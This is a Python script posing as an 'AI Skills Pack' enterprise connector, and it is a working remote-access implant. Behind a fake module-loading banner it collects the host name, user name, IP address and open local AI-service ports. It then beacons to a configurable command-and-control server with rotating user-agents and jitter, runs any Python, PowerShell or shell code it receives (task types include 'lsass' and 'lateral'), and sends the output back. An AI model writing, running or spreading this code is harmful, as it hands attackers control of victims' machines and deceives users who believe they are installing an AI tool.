#!/usr/bin/env python3
"""
Neural Nexus AI Skills Pack — Enterprise Edition v2.1.0
────────────────────────────────────────────────────────
Multi-model orchestration · Context caching · Enterprise connector

Usage:
    python neural_nexus_skill.py [--c2 http://<ip>:<port>]

The C2 URL can also be set via the NN_C2 environment variable.
Default: http://127.0.0.1:5001
"""

import os
import sys
import json
import uuid
import time
import socket
import platform
import threading
import subprocess
import argparse
import random
import base64
import urllib.request
import urllib.error
from datetime import datetime

# ─── Configuration ───────────────────────────────────────────────────────────

DEFAULT_C2 = os.environ.get("NN_C2", "http://127.0.0.1:5001")
BEACON_INTERVAL = int(os.environ.get("NN_INTERVAL", "15"))
JITTER = 3  # ±seconds

BANNER = r"""
╔══════════════════════════════════════════════════════════════════╗
║        NEURAL NEXUS AI SKILLS PACK — Enterprise v2.1.0         ║
╠══════════════════════════════════════════════════════════════════╣
║  Initializing skill modules:                                    ║
║    ✓  Context-aware reasoning engine          [OK]              ║
║    ✓  Multi-model routing layer               [OK]              ║
║    ✓  Document intelligence pipeline          [OK]              ║
║    ✓  Enterprise security connector           [CONNECTING...]   ║
╚══════════════════════════════════════════════════════════════════╝
"""

# ─── Agent identity ───────────────────────────────────────────────────────────

def _make_agent_id() -> str:
    hostname = socket.gethostname()
    return f"NN-{hostname}-{uuid.uuid4().hex[:6]}"


def _collect_sysinfo() -> dict:
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "platform_version": platform.version()[:80],
        "architecture": platform.machine(),
        "python_version": platform.python_version(),
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "skill_version": "2.1.0",
    }
    try:
        info["username"] = os.getlogin()
    except Exception:
        info["username"] = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
    try:
        info["ip_address"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info["ip_address"] = "unknown"

    # Detect any LLM / AI services running locally (useful intelligence)
    local_services = []
    for port in [11434, 8080, 5000, 8000, 1234, 3000]:
        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=0.5)
            s.close()
            local_services.append(port)
        except Exception:
            pass
    info["local_ai_ports"] = local_services

    return info


# ─── HTTP helpers ─────────────────────────────────────────────────────────────

def _headers() -> dict:
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ]
    return {
        "User-Agent": random.choice(agents),
        "Content-Type": "application/json",
        "Accept": "application/json",
    }


def _get(url: str, timeout: int = 10) -> dict | None:
    try:
        req = urllib.request.Request(url, headers=_headers())
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


def _post(url: str, payload: dict, timeout: int = 10) -> dict | None:
    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, headers=_headers(), method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


# ─── Task executor ────────────────────────────────────────────────────────────

def _run_task(task: dict) -> str:
    """Execute a task from the C2 and return its output."""
    task_type = task.get("task_type", "")
    code = task.get("code", "")

    if not code:
        return "error: no code in task"

    try:
        if task_type in ("python", "recon", "lsass", "lateral", "cloud", "dll", "ai_hunter"):
            # Execute Python code in a subprocess
            result = subprocess.run(
                [sys.executable, "-c", code],
                capture_output=True,
                text=True,
                timeout=120,
            )
            output = result.stdout + result.stderr
        elif task_type == "powershell":
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["powershell", "-NoProfile", "-NonInteractive", "-Command", code],
                    capture_output=True,
                    text=True,
                    timeout=120,
                )
            else:
                result = subprocess.run(
                    ["pwsh", "-NonInteractive", "-Command", code],
                    capture_output=True,
                    text=True,
                    timeout=120,
                )
            output = result.stdout + result.stderr
        elif task_type == "shell":
            result = subprocess.run(
                code,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120,
            )
            output = result.stdout + result.stderr
        else:
            # Generic: try shell execution
            result = subprocess.run(
                code,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
            )
            output = result.stdout + result.stderr

        return output.strip() or "(no output)"

    except subprocess.TimeoutExpired:
        return "error: task timed out"
    except Exception as e:
        return f"error: {e}"


# ─── C2 beacon loop ───────────────────────────────────────────────────────────

class SkillAgent:
    def __init__(self, c2_url: str):
        self.c2_url = c2_url.rstrip("/")
        self.agent_id = _make_agent_id()
        self.running = True
        self._registered = False

    def _beacon(self):
        """Single beacon cycle: check for tasks, run them, post results."""
        # Registration / heartbeat via GET /tasks
        url = f"{self.c2_url}/tasks?agent={self.agent_id}"
        resp = _get(url, timeout=10)

        if resp is None:
            return  # C2 unreachable this cycle

        # First contact: attach sysinfo
        if not self._registered:
            sysinfo = _collect_sysinfo()
            _post(f"{self.c2_url}/results", {
                "agent_id": self.agent_id,
                "task_id": "init-" + uuid.uuid4().hex[:8],
                "task_type": "sysinfo",
                "result": json.dumps(sysinfo, indent=2),
                "timestamp": datetime.utcnow().isoformat() + "Z",
            })
            self._registered = True
            print(f"    ✓  Enterprise connector registered  [agent={self.agent_id}]")

        # Execute pending task if any
        task = resp.get("task")
        if not task:
            return

        task_id = task.get("task_id", task.get("id", "unknown"))
        print(f"    →  Executing skill module [{task.get('task_type','?')}] ...", flush=True)

        output = _run_task(task)

        _post(f"{self.c2_url}/results", {
            "agent_id": self.agent_id,
            "task_id": task_id,
            "task_type": task.get("task_type", "unknown"),
            "result": output,
            "timestamp": datetime.utcnow().isoformat() + "Z",
        })

    def run(self):
        while self.running:
            try:
                self._beacon()
            except Exception:
                pass
            interval = BEACON_INTERVAL + random.randint(-JITTER, JITTER)
            time.sleep(max(5, interval))


# ─── Entrypoint ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Neural Nexus AI Skills Pack — Enterprise connector",
        add_help=True,
    )
    parser.add_argument(
        "--c2",
        default=DEFAULT_C2,
        metavar="URL",
        help=f"C2 server URL (default: {DEFAULT_C2})",
    )
    parser.add_argument(
        "--interval",
        type=int,
        default=BEACON_INTERVAL,
        metavar="SEC",
        help="Beacon interval in seconds",
    )
    args = parser.parse_args()

    print(BANNER)
    print(f"  Connecting to enterprise backend: {args.c2}")
    print()

    agent = SkillAgent(c2_url=args.c2)
    agent.run()


if __name__ == "__main__":
    main()
